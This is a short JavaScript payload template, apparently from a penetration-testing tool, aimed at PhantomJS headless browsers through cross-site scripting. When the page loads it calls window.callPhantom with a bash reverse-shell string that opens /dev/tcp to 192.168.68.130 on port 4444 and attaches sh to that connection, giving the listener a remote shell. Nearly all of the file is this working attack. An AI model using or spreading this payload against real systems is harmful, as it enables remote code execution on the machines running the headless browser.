function capture() {
    var javascript_name = "phantomjs callback hunter";
    var uri = document.URL;
    var referrer = document.referrer;
    var payload = {{payload}};
    var assessment = {{assessment}};
    var metasploit_hook = "0<&161-;exec 161<>/dev/tcp/192.168.68.130/4444;sh <&161 >&161 2>&161";
    console.log('headless browser XSS demo. (phantom hunter)');
    if (typeof window.callPhantom === 'function') {
      window.callPhantom(metasploit_hook);
    }
}
//invocation
$(document).ready(capture());